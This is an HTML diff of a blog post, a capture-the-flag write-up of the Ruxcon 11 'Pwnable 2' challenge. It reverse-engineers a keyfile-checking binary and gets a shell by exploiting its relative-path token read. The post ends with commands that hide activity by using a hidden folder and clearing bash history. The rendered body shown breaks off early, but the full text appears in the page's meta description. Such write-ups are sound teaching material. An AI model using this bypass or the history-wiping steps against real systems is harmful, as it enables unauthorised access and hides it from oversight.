@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>Ruxcon 11 [Pwnable 2] Write Up</title>
+  <meta name="description" content="This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user’s home directory contained two files: level2 and tokenfile. file and cat quickly revealed that level2 is an x86–64 ELF executable that hasn’t been stripped. tokenfile is a text file but we can’t read it. Presumably then the aim of the challenge is to read that file! ➜ pwnable2 file level2 level2: ELF 64-bit LSB executable, x86–64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86–64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e98e13b917a49c072e0ba9035947d21ba91a706d, not stripped When we run level2 it requests a keyfile specified as a path or the character “-” which specifies “give me the keyfile on stdin”. Before doing anything, run strings over the binary. It’ll help you get the lay of the land, and in some (silly) cases, you’ll find the flag. Strings doesn’t yield the flag but it does reveal some interesting strings that sound like function names: ➜ pwnable2 strings level2 &amp;lt;snip&amp;gt; parse_header no_keys &amp;lt;snip&amp;gt; auth_scheme sizetype key_for_scheme token_from_file XorDecode try_authenticate &amp;lt;snip&amp;gt; mod_table encoding_table base64_encode base64_decode build_decoding_table base64_cleanup input_length output_length encoded_data &amp;lt;snip&amp;gt; Looks like there’s authentication attempts, parsing, base64, decoding, etc. We’ll start simple though; because we’re mad hax0rz, we’ll initially assume that the password is password. ➜ pwnable2 ./level2 — beans Usage: ./level2 &amp;lt;keyfile&amp;gt; or — for stdin ➜ pwnable2 ./level2 - password Invalid Scheme specified. FOILED! The password wasn’t password. Undeterred, we’ll try running ltrace to look for interesting function calls. ➜ pwnable2 ltrace ./level2 - __libc_start_main(0x400c00, 2, 0x7ffc819d44d8, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“-”, “-”) = 0 malloc(1032) = 0x16bd010 __isoc99_fscanf(0x7f4c18f5c4e0, 0x401834, 0x16bd010, 0x16bd018 password ) = 0 malloc(0) = 0x16bd420 malloc(4104) = 0x16bd440 strcmp(“”, “XOR”) = -88 strcmp(“”, “NOENCRYPT”) = -78 fprintf(0x7f4c18f5c060, “Invalid Scheme specified.\n”Invalid Scheme specified. ) = 26 +++ exited (status 1) +++ Notice the calls to strcmp(&quot;&quot;, &quot;XOR&quot;) and strcmp(&quot;&quot;, &quot;NOENCRYPT&quot;), followed by the call that prints “Invalid Scheme specified”. Looks like our input will need to pass a comparison with either “XOR” or “NOENCRYPT” (or both!) While that sounds like a good start, notice that our ninja input guess of “password” doesn’t appear in either of those comparisons! hmmm … it looks like our input is being read in via fscanf so let’s break out GDB and find out what’s going on. Note that I’m using the superduper awesome Python Exploit Development Assistant ‘peda.py’ for GDB, it makes GDB not suck in the way that milk makes cereal not suck. Here, we run gdb level2, set a breakpoint for the __isoc99_fscanf function and set up the program arguments to accept input from stdin. Whenever GDB breaks, PEDA prints a dump of the processor state (no more spamming i r!) at the top we have a register dump, followed by disassembly around the current program counter and a memory dump. It looks like rsi contains the format string being passed to fscanf, that’s going to determine what gets read in. The manual for fscanf should contain everything we need to interpret the format string. SCANF(3) Linux Programmer’s Manual SCANF(3) NAME scanf, fscanf, sscanf, vscanf, vsscanf, vfscanf — input format conversion SYNOPSIS #include &amp;lt;stdio.h&amp;gt; int scanf(const char *format, …); int fscanf(FILE *stream, const char *format, …); &amp;lt;snip&amp;gt; The conversion specifications in format are of two forms, either beginning with ‘%’ or beginning with “%n$”. The two forms should not be mixed in the same format string, except that a string containing “%n$” specifications can include %% and %*. If format contains ‘%’ specifications, then these correspond in order with successive pointer arguments. In the “%n$” form (which is specified in POSIX.1–2001, but not C99), n is a decimal integer that specifies that the converted input should be placed in the location referred to by the n-th pointer argument following format. Conversions l Indicates either that the conversion will be one of d, i, o, u, x, X, or n and the next pointer is a pointer to a long int or unsigned long int (rather than int), or that the conversion will be one of e, f, or g and the next pointer is a pointer to double (rather than float). Specifying two l characters is equivalent to L. If used with %c or %s, the corresponding parameter is considered as a pointer to a wide character or wide-character string respectively. u Matches an unsigned decimal integer; the next pointer must be a pointer to unsigned int. s Matches a sequence of non-white-space characters; the next pointer must be a pointer to character array that is long enough to hold the input sequence and the terminating null byte (‘\0’), which is added automatically. The input string stops at white space or at the maximum field width, whichever occurs first. &amp;lt;snip&amp;gt; The fscanf format string, &quot;%lu:%1023s&quot;, can be broken down into the following: %lu — unsigned long : — ASCII character “:” %1023s — 1023 character string (1024 with the null terminator). Before, we just passed in the string “password” and our input didn’t make it to the strcmp instructions. Let’s adjust the format to match the fscanf format string and try again. To make things neater, we’ll also put our input in a keyfile rather than entering it via stdin. ➜ pwnable2 echo “123:password” &amp;gt; key1 Changing the format seems to have worked! We now see the string “password” being compared against “XOR” and “NOENCRYPT”, but we still hit the “Invalid Scheme specified” message. If we change our input to “123:NOENCRYPT” we see the following: strcmp(&quot;NOENCRYPT&quot;, &quot;NOENCRYPT&quot;), looks good! ➜ pwnable2 ltrace ./level2 ./key1 __libc_start_main(0x400c00, 2, 0x7ffe6b0f31e8, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“./key1”, “-”) = 1 fopen(“./key1”, “r”) = 0x2072010 malloc(1032) = 0x2072250 __isoc99_fscanf(0x2072010, 0x401834, 0x2072250, 0x2072258) = 2 malloc(629760) = 0x7f2d3cf19010 malloc(4104) = 0x2072660 strcmp(“password”, “XOR”) = 24 strcmp(“password”, “NOENCRYPT”) = 34 fprintf(0x7f2d3cdba060, “Invalid Scheme specified.\n”Invalid Scheme specified. ) = 26 +++ exited (status 1) +++ ➜ pwnable2 echo “123:NOENCRYPT” &amp;gt; key2 ➜ pwnable2 ltrace ./level2 ./key2 __libc_start_main(0x400c00, 2, 0x7ffc0232d358, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“./key2”, “-”) = 1 fopen(“./key2”, “r”) = 0xc43010 malloc(1032) = 0xc43250 __isoc99_fscanf(0xc43010, 0x401834, 0xc43250, 0xc43258) = 2 malloc(629760) = 0x7efc1ddcd010 malloc(4104) = 0xc43660 strcmp(“NOENCRYPT”, “XOR”) = -10 strcmp(“NOENCRYPT”, “NOENCRYPT”) = 0 strcpy(0xc43668, “No Encryption”) = 0xc43668 __isoc99_fscanf(0xc43010, 0x401962, 0x7efc1ddcd010, 0x7efc1ddcd010) = 0xffffffff fprintf(0x7efc1dc6e060, “In.correct number of entries. Exp”…, 123, 0Incorrect number of entries. Expected 123 but found 0 ) = 54 +++ exited (status 1) +++ Now we’re getting the message: “Incorrect number of entries. Expected 123 but found 0”. Looks like that number we pass in is some kind of counter. Apparently our keyfile contains zero entries, let’s try adding stuff to the keyfile. Adding the line “password” changes the message to “Incorrect number of entries. Expected 123 but found 1”, looks like the number we pass in is a counter for the number of lines in the keyfile. ➜ pwnable2 echo “0:NOENCRYPT\npassword” &amp;gt; key3 ➜ pwnable2 ./level2 ./key3 Incorrect number of entries. Expected 123 but found 1 ➜ pwnable2 echo “1:NOENCRYPT\npassword” &amp;gt; key3 ➜ pwnable2 ./level2 ./key3 Awesome! Sort of … nothing actually happens and we clearly haven’t pwned anything, nor is it raining shellz. Let’s break out IDA to work out how we’re actually going to break this thing. Once the binary is loaded and disassembled, jump into the strings window (SHIFT+F12). We’re assuming that we want to properly authenticate with the binary so let’s trace where the following string is used: “Congratulations. You’re authenticated!” Double click the string, this will jump to a table in the .rodata section, use Ctrl+x to find cross-references to the string, there’s only one in this instance. So if we authenticate correctly, we get a shell. It sure looks like we’re in the right place. But we can’t read the token file! If we can’t read the token file it’s going to be real difficult to construct a valid keyfile. If we drill down into the token_from_file function we find the following interesting code block. There it is! It looks like the program is opening the tokenfile from a relative path rather than an absolute one. We can totally abuse this! I forgot to take screenshots during the actual competition but permissions on the tokenfile were such that the user running the level2 binary wasn’t able to read the tokenfile, but they did allow us to move the binary. Because the tokenfile is being opened from ./tokenfile, if we move the binary to somewhere like /tmp and create our own token file, we should be able to authenticate successfully. Let’s test that theory! ➜ /tmp echo -n “1:NOENCRYPT\nwinning” &amp;gt; key5 ➜ /tmp echo -n “winning” &amp;gt; tokenfile ➜ /tmp ./level2 ./key5 Key entry too large. Looks like we’ve missed something. Let’s find the message “Key entry too large” in IDA. If the comparison fails and the branch isn’t taken the program prints “Key entry too large” and exits. This comparison seems to be comparing a variable to -1 directly after a base64 decode operation. Following the flow in IDA, there are 3 paths from this point. Either the program prints “Key entry too large”, “Incorrectly encoded entry” or it proceeds to the try_authenticate function. If we break in GDB at the point where base64_decode is called we see a pointer (0x602660) to our keyfile entry, “winning”, being passed as an argument. Decoding “winning” as base64 will clearly fail so perhaps we need to encode our input. Also note that because the binary isn’t stripped, we can see the name of the original source file at the point where GDB breaks: authenticate_with_keyfile_b64dec.c. Sounds good, let’s try it. ➜ /tmp echo “1:NOENCRYPT” &amp;gt; key6 ➜ /tmp echo -n “winning” | base64 &amp;gt;&amp;gt; key6 ➜ /tmp ./level2 ./key6 # # cd /home/level2 # ls level2 tokenfile # cat tokenfile RUX{not_the_actual_flag_but_you_still_win} # exit Congratulations. You’re authenticated ➜ /tmp BOOM, we get a shell, change back to the challenge directory and we can read the tokenfile which contains the original flag (I’m afraid I don’t remember the actual flag). We didn’t explore the XOR function but evidentially we didn’t need it to solve the challenge. Perhaps as the subject of a follow-up post. As a final note, this challenge was hosted on a server accessible by all teams. That means that anyone watching the bash history can see what you’re doing, making it a delicate operation to solve the challenge without revealing your methods. As a minimum, I’d recommend creating a hidden folder, working from there, then deleting the bash history. ➜ pwnable2 mkdir /.fd788743c5e54c528a6088c650cf8a9d ➜ pwnable2 cp level2 /.fd788743c5e54c528a6088c650cf8a9d &amp;lt;pwn all the things&amp;gt; ➜ pwnable2 history -c ➜ pwnable2 cat /dev/null &amp;gt; ~/.bash_history You know … just to be sure. Happy hunting.">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://blog.x86.party/2018/02/01/ruxcon-11-pwnable-2-writeup/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="x86party" href="https://blog.x86.party/feed.xml">
+
+  
+
+  
+  <meta property="og:title" content="Ruxcon 11 [Pwnable 2] Write Up">
+  <meta property="og:site_name" content="x86party">
+  <meta property="og:url" content="https://blog.x86.party/2018/02/01/ruxcon-11-pwnable-2-writeup/">
+  <meta property="og:description" content="This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user’s home directory contained two files: level2 and tokenfile. file and cat quickly revealed that level2 is an x86–64 ELF executable that hasn’t been stripped. tokenfile is a text file but we can’t read it. Presumably then the aim of the challenge is to read that file! ➜ pwnable2 file level2 level2: ELF 64-bit LSB executable, x86–64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86–64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e98e13b917a49c072e0ba9035947d21ba91a706d, not stripped When we run level2 it requests a keyfile specified as a path or the character “-” which specifies “give me the keyfile on stdin”. Before doing anything, run strings over the binary. It’ll help you get the lay of the land, and in some (silly) cases, you’ll find the flag. Strings doesn’t yield the flag but it does reveal some interesting strings that sound like function names: ➜ pwnable2 strings level2 &amp;lt;snip&amp;gt; parse_header no_keys &amp;lt;snip&amp;gt; auth_scheme sizetype key_for_scheme token_from_file XorDecode try_authenticate &amp;lt;snip&amp;gt; mod_table encoding_table base64_encode base64_decode build_decoding_table base64_cleanup input_length output_length encoded_data &amp;lt;snip&amp;gt; Looks like there’s authentication attempts, parsing, base64, decoding, etc. We’ll start simple though; because we’re mad hax0rz, we’ll initially assume that the password is password. ➜ pwnable2 ./level2 — beans Usage: ./level2 &amp;lt;keyfile&amp;gt; or — for stdin ➜ pwnable2 ./level2 - password Invalid Scheme specified. FOILED! The password wasn’t password. Undeterred, we’ll try running ltrace to look for interesting function calls. ➜ pwnable2 ltrace ./level2 - __libc_start_main(0x400c00, 2, 0x7ffc819d44d8, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“-”, “-”) = 0 malloc(1032) = 0x16bd010 __isoc99_fscanf(0x7f4c18f5c4e0, 0x401834, 0x16bd010, 0x16bd018 password ) = 0 malloc(0) = 0x16bd420 malloc(4104) = 0x16bd440 strcmp(“”, “XOR”) = -88 strcmp(“”, “NOENCRYPT”) = -78 fprintf(0x7f4c18f5c060, “Invalid Scheme specified.\n”Invalid Scheme specified. ) = 26 +++ exited (status 1) +++ Notice the calls to strcmp(&quot;&quot;, &quot;XOR&quot;) and strcmp(&quot;&quot;, &quot;NOENCRYPT&quot;), followed by the call that prints “Invalid Scheme specified”. Looks like our input will need to pass a comparison with either “XOR” or “NOENCRYPT” (or both!) While that sounds like a good start, notice that our ninja input guess of “password” doesn’t appear in either of those comparisons! hmmm … it looks like our input is being read in via fscanf so let’s break out GDB and find out what’s going on. Note that I’m using the superduper awesome Python Exploit Development Assistant ‘peda.py’ for GDB, it makes GDB not suck in the way that milk makes cereal not suck. Here, we run gdb level2, set a breakpoint for the __isoc99_fscanf function and set up the program arguments to accept input from stdin. Whenever GDB breaks, PEDA prints a dump of the processor state (no more spamming i r!) at the top we have a register dump, followed by disassembly around the current program counter and a memory dump. It looks like rsi contains the format string being passed to fscanf, that’s going to determine what gets read in. The manual for fscanf should contain everything we need to interpret the format string. SCANF(3) Linux Programmer’s Manual SCANF(3) NAME scanf, fscanf, sscanf, vscanf, vsscanf, vfscanf — input format conversion SYNOPSIS #include &amp;lt;stdio.h&amp;gt; int scanf(const char *format, …); int fscanf(FILE *stream, const char *format, …); &amp;lt;snip&amp;gt; The conversion specifications in format are of two forms, either beginning with ‘%’ or beginning with “%n$”. The two forms should not be mixed in the same format string, except that a string containing “%n$” specifications can include %% and %*. If format contains ‘%’ specifications, then these correspond in order with successive pointer arguments. In the “%n$” form (which is specified in POSIX.1–2001, but not C99), n is a decimal integer that specifies that the converted input should be placed in the location referred to by the n-th pointer argument following format. Conversions l Indicates either that the conversion will be one of d, i, o, u, x, X, or n and the next pointer is a pointer to a long int or unsigned long int (rather than int), or that the conversion will be one of e, f, or g and the next pointer is a pointer to double (rather than float). Specifying two l characters is equivalent to L. If used with %c or %s, the corresponding parameter is considered as a pointer to a wide character or wide-character string respectively. u Matches an unsigned decimal integer; the next pointer must be a pointer to unsigned int. s Matches a sequence of non-white-space characters; the next pointer must be a pointer to character array that is long enough to hold the input sequence and the terminating null byte (‘\0’), which is added automatically. The input string stops at white space or at the maximum field width, whichever occurs first. &amp;lt;snip&amp;gt; The fscanf format string, &quot;%lu:%1023s&quot;, can be broken down into the following: %lu — unsigned long : — ASCII character “:” %1023s — 1023 character string (1024 with the null terminator). Before, we just passed in the string “password” and our input didn’t make it to the strcmp instructions. Let’s adjust the format to match the fscanf format string and try again. To make things neater, we’ll also put our input in a keyfile rather than entering it via stdin. ➜ pwnable2 echo “123:password” &amp;gt; key1 Changing the format seems to have worked! We now see the string “password” being compared against “XOR” and “NOENCRYPT”, but we still hit the “Invalid Scheme specified” message. If we change our input to “123:NOENCRYPT” we see the following: strcmp(&quot;NOENCRYPT&quot;, &quot;NOENCRYPT&quot;), looks good! ➜ pwnable2 ltrace ./level2 ./key1 __libc_start_main(0x400c00, 2, 0x7ffe6b0f31e8, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“./key1”, “-”) = 1 fopen(“./key1”, “r”) = 0x2072010 malloc(1032) = 0x2072250 __isoc99_fscanf(0x2072010, 0x401834, 0x2072250, 0x2072258) = 2 malloc(629760) = 0x7f2d3cf19010 malloc(4104) = 0x2072660 strcmp(“password”, “XOR”) = 24 strcmp(“password”, “NOENCRYPT”) = 34 fprintf(0x7f2d3cdba060, “Invalid Scheme specified.\n”Invalid Scheme specified. ) = 26 +++ exited (status 1) +++ ➜ pwnable2 echo “123:NOENCRYPT” &amp;gt; key2 ➜ pwnable2 ltrace ./level2 ./key2 __libc_start_main(0x400c00, 2, 0x7ffc0232d358, 0x4017b0 &amp;lt;unfinished …&amp;gt; strcmp(“./key2”, “-”) = 1 fopen(“./key2”, “r”) = 0xc43010 malloc(1032) = 0xc43250 __isoc99_fscanf(0xc43010, 0x401834, 0xc43250, 0xc43258) = 2 malloc(629760) = 0x7efc1ddcd010 malloc(4104) = 0xc43660 strcmp(“NOENCRYPT”, “XOR”) = -10 strcmp(“NOENCRYPT”, “NOENCRYPT”) = 0 strcpy(0xc43668, “No Encryption”) = 0xc43668 __isoc99_fscanf(0xc43010, 0x401962, 0x7efc1ddcd010, 0x7efc1ddcd010) = 0xffffffff fprintf(0x7efc1dc6e060, “In.correct number of entries. Exp”…, 123, 0Incorrect number of entries. Expected 123 but found 0 ) = 54 +++ exited (status 1) +++ Now we’re getting the message: “Incorrect number of entries. Expected 123 but found 0”. Looks like that number we pass in is some kind of counter. Apparently our keyfile contains zero entries, let’s try adding stuff to the keyfile. Adding the line “password” changes the message to “Incorrect number of entries. Expected 123 but found 1”, looks like the number we pass in is a counter for the number of lines in the keyfile. ➜ pwnable2 echo “0:NOENCRYPT\npassword” &amp;gt; key3 ➜ pwnable2 ./level2 ./key3 Incorrect number of entries. Expected 123 but found 1 ➜ pwnable2 echo “1:NOENCRYPT\npassword” &amp;gt; key3 ➜ pwnable2 ./level2 ./key3 Awesome! Sort of … nothing actually happens and we clearly haven’t pwned anything, nor is it raining shellz. Let’s break out IDA to work out how we’re actually going to break this thing. Once the binary is loaded and disassembled, jump into the strings window (SHIFT+F12). We’re assuming that we want to properly authenticate with the binary so let’s trace where the following string is used: “Congratulations. You’re authenticated!” Double click the string, this will jump to a table in the .rodata section, use Ctrl+x to find cross-references to the string, there’s only one in this instance. So if we authenticate correctly, we get a shell. It sure looks like we’re in the right place. But we can’t read the token file! If we can’t read the token file it’s going to be real difficult to construct a valid keyfile. If we drill down into the token_from_file function we find the following interesting code block. There it is! It looks like the program is opening the tokenfile from a relative path rather than an absolute one. We can totally abuse this! I forgot to take screenshots during the actual competition but permissions on the tokenfile were such that the user running the level2 binary wasn’t able to read the tokenfile, but they did allow us to move the binary. Because the tokenfile is being opened from ./tokenfile, if we move the binary to somewhere like /tmp and create our own token file, we should be able to authenticate successfully. Let’s test that theory! ➜ /tmp echo -n “1:NOENCRYPT\nwinning” &amp;gt; key5 ➜ /tmp echo -n “winning” &amp;gt; tokenfile ➜ /tmp ./level2 ./key5 Key entry too large. Looks like we’ve missed something. Let’s find the message “Key entry too large” in IDA. If the comparison fails and the branch isn’t taken the program prints “Key entry too large” and exits. This comparison seems to be comparing a variable to -1 directly after a base64 decode operation. Following the flow in IDA, there are 3 paths from this point. Either the program prints “Key entry too large”, “Incorrectly encoded entry” or it proceeds to the try_authenticate function. If we break in GDB at the point where base64_decode is called we see a pointer (0x602660) to our keyfile entry, “winning”, being passed as an argument. Decoding “winning” as base64 will clearly fail so perhaps we need to encode our input. Also note that because the binary isn’t stripped, we can see the name of the original source file at the point where GDB breaks: authenticate_with_keyfile_b64dec.c. Sounds good, let’s try it. ➜ /tmp echo “1:NOENCRYPT” &amp;gt; key6 ➜ /tmp echo -n “winning” | base64 &amp;gt;&amp;gt; key6 ➜ /tmp ./level2 ./key6 # # cd /home/level2 # ls level2 tokenfile # cat tokenfile RUX{not_the_actual_flag_but_you_still_win} # exit Congratulations. You’re authenticated ➜ /tmp BOOM, we get a shell, change back to the challenge directory and we can read the tokenfile which contains the original flag (I’m afraid I don’t remember the actual flag). We didn’t explore the XOR function but evidentially we didn’t need it to solve the challenge. Perhaps as the subject of a follow-up post. As a final note, this challenge was hosted on a server accessible by all teams. That means that anyone watching the bash history can see what you’re doing, making it a delicate operation to solve the challenge without revealing your methods. As a minimum, I’d recommend creating a hidden folder, working from there, then deleting the bash history. ➜ pwnable2 mkdir /.fd788743c5e54c528a6088c650cf8a9d ➜ pwnable2 cp level2 /.fd788743c5e54c528a6088c650cf8a9d &amp;lt;pwn all the things&amp;gt; ➜ pwnable2 history -c ➜ pwnable2 cat /dev/null &amp;gt; ~/.bash_history You know … just to be sure. Happy hunting.">
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="x86party">
+  <meta name="twitter:title" content="Ruxcon 11 [Pwnable 2] Write Up">
+  <meta name="twitter:description" content="This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user’s home directory contained two files: level2 and tokenfile. file and cat q...">
+  
+    <meta name="twitter:creator" content="x86party">
+  
+  
+
+  <link rel="dns-prefetch" href="https://fonts.gstatic.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700&display=swap" rel="stylesheet">
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">x86party</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+        
+        <a class="page-link" href="https://github.com/yous/whiteglass">GitHub</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">Ruxcon 11 [Pwnable 2] Write Up</h1>
+    
+    <p class="post-meta"><time datetime="2018-02-01T00:00:00+00:00" itemprop="datePublished">Feb 1, 2018</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/ctf/">ctf</a>
+      
+    
+  
+
+
+ •
+  
+    
+    
+      
+        <a href="/tags/ctf/">ctf</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+        <a href="/tags/writeup/">writeup</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+        <a href="/tags/pwnable/">pwnable</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/tags/ida/">ida</a>,
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/tags/re/">re</a>
+      
+    
+      
+    
+  
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user’s home directory contained two files: level2 and tokenfile. <code class="highlighter-rouge">file</code> and <code class="highlighter-rouge">cat</code> quickly revealed that <code class="highlighter-rouge">level2</code> is an x86–64 ELF executable that hasn’t been stripped. <code class="highlighter-rouge">tokenfile</code> is a text file but we can’t read it. Presumably then the aim of the challenge is to read that file!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ pwnable2 file level2
+level2: ELF 64-bit LSB executable, x86–64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, 
+interpreter /lib64/ld-linux-x86–64.so.2, <span class="k">for </span>GNU/Linux 2.6.32, 
+BuildID[sha1]<span class="o">=</span>e98e13b917a49c072e0ba9035947d21ba91a706d, not stripped
+</code></pre></div></div>
+
+<p>When we run <code class="highlighter-rouge">level2</code> it requests a keyfile specified as a path or the character “-” which specifies “give me the keyfile on stdin”.
+Before doing anything, run strings over the binary. It’ll help you get the lay of the land, and in some (silly) cases, you’ll find the flag. Strings doesn’t yield the flag but it does reveal some interesting strings that sound like function names:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ pwnable2 strings level2
+&lt;snip&gt;
+
+parse_header
+no_keys
+
+&lt;snip&gt;
+
+auth_scheme
+sizetype
+key_for_scheme
+token_from_file
+XorDecode
+try_authenticate
+
+&lt;snip&gt;
+
+mod_table
+encoding_table
+base64_encode
+base64_decode
+build_decoding_table
+base64_cleanup
+input_length
+output_length
+encoded_data
+
+&lt;snip&gt;
+</code></pre></div></div>
+
+<p>Looks like there’s authentication attempts, parsing, base64, decoding, etc.
+We’ll start simple though; because we’re mad hax0rz, we’ll initially assume that the password is password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ pwnable2 ./level2 — beans
+Usage: ./level2 &lt;keyfile&gt; or — <span class="k">for </span>stdin
+
+➜ pwnable2 ./level2 -
+password
+Invalid Scheme specified.
+</code></pre></div></div>
+
+<p>FOILED! The password wasn’t password. Undeterred, we’ll try running ltrace to look for interesting function calls.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ pwnable2 ltrace ./level2 -
+__libc_start_main<span class="o">(</span>0x400c00, 2, 0x7ffc819d44d8, 0x4017b0 &lt;unfinished …&gt;
+strcmp<span class="o">(</span>“-”, “-”<span class="o">)</span> <span class="o">=</span> 0
+malloc<span class="o">(</span>1032<span class="o">)</span> <span class="o">=</span> 0x16bd010
+__isoc99_fscanf<span class="o">(</span>0x7f4c18f5c4e0, 0x401834, 0x16bd010, 0x16bd018 password
+<span class="o">)</span> <span class="o">=</span> 0
+malloc<span class="o">(</span>0<span class="o">)</span> <span class="o">=</span> 0x16bd420
+malloc<span class="o">(</span>4104<span class="o">)</span> <span class="o">=</span> 0x16bd440
+strcmp<span class="o">(</span>“”, “XOR”<span class="o">)</span> <span class="o">=</span> <span class="nt">-88</span>
+strcmp<span class="o">(</span>“”, “NOENCRYPT”<span class="o">)</span> <span class="o">=</span> <span class="nt">-78</span>
+fprintf<span class="o">(</span>0x7f4c18f5c060, “Invalid Scheme specified.<span class="se">\n</span>”Invalid Scheme specified.
+<span class="o">)</span> <span class="o">=</span> 26
++++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
+</code></pre></div></div>
+
+<p>Notice the calls to <code class="highlighter-rouge">strcmp("", "XOR")</code> and <code class="highlighter-rouge">strcmp("", "NOENCRYPT")</code>, followed by the call that prints “Invalid Scheme specified”. Looks like our input will need to pass a comparison with either “XOR” or “NOENCRYPT” (or both!) While that sounds like a good start, notice that our ninja input guess of “password” doesn’t appear in either of those comparisons! hmmm … it looks like our input is being read in via fscanf so let’s break out GDB and find out what’s going on.</p>
+
+<p>Note that I’m using the superduper awesome Python Exploit Development Assistant ‘peda.py’ for GDB, it makes GDB not suck in the way that <a href="https://theoatmeal.com/pl/minor_differences/cereal">milk makes cereal not suck</a>.<br />
+Here, we run gdb <code class="highlighter-rouge">level2</code>, set a breakpoint for the <code class="highlighter-rouge">__isoc99_fscanf</code> function and set up the program arguments to accept input from stdin.</p>
+
+<p><img src="/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-1.png" alt="Breaking on __isoc99_fscanf in GDB" /></p>
+
+<p>Whenever GDB breaks, PEDA prints a dump of the processor state (no more spamming <code class="highlighter-rouge">i r</code>!) at the top we have a register dump, followed by disassembly around the current program counter and a memory dump. It looks like rsi contains the format string being passed to fscanf, that’s going to determine what gets read in. The manual for fscanf should contain everything we need to interpret the format string.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SCANF(3) Linux Programmer’s Manual SCANF(3)
+
+NAME
+scanf, fscanf, sscanf, vscanf, vsscanf, vfscanf — input format conversion
+SYNOPSIS
+#include &lt;stdio.h&gt;
+int scanf(const char *format, …);
+int fscanf(FILE *stream, const char *format, …);
+
+&lt;snip&gt;
+
+The conversion specifications in format are of two forms, either beginning with ‘%’
+or beginning with “%n$”. The two forms should not be mixed in the same format
+string, except that a string containing “%n$” specifications can include %% and %*.
+If format contains ‘%’ specifications, then these correspond in order with
+successive pointer arguments. In the “%n$” form (which is specified in
+POSIX.1–2001, but not C99), n is a decimal integer that specifies that the converted
+input should be placed in the location referred to by the n-th pointer argument
+following format.
+
+Conversions
+l Indicates either that the conversion will be one of d, i, o, u,
+x, X, or n and the next pointer is a pointer to a long int or unsigned long
+int (rather than int), or that the conversion will be one of e, f, or g
+and the next pointer is a pointer to double (rather than float). Specifying
+two l characters is equivalent to L. If used with %c or %s, the
+corresponding parameter is considered as a pointer to a wide character or
+wide-character string respectively.
+u Matches an unsigned decimal integer; the next pointer must be a pointer
+to unsigned int.
+s Matches a sequence of non-white-space characters; the next pointer
+must be a pointer to character array that is long enough to hold the input
+sequence and the terminating null byte (‘\0’), which is added
+automatically. The input string stops at white space or at the maximum
+field width, whichever occurs first.
+
+&lt;snip&gt;
+</code></pre></div></div>
+<p>The fscanf format string, <code class="highlighter-rouge">"%lu:%1023s"</code>, can be broken down into the following:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">%lu</code> — unsigned long</li>
+  <li><code class="highlighter-rouge">:</code> — ASCII character “:”</li>
+  <li><code class="highlighter-rouge">%1023s</code> — 1023 character string (1024 with the null terminator).</li>
+</ul>
+
+<p>Before, we just passed in the string “password” and our input didn’t make it to the <code class="highlighter-rouge">strcmp</code> instructions. Let’s adjust the format to match the fscanf format string and try again. To make things neater, we’ll also put our input in a keyfile rather than entering it via stdin.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ pwnable2 <span class="nb">echo</span> “123:password” <span class="o">&gt;</span> key1
+</code></pre></div></div>
+
+<p>Changing the format seems to have worked! We now see the string “password” being compared against “XOR” and “NOENCRYPT”, but we still hit the “Invalid Scheme specified” message. If we change our input to “123:NOENCRYPT” we see the following: <code class="highlighter-rouge">strcmp("NOENCRYPT", "NOENCRYPT")</code>, looks good!</p>
+
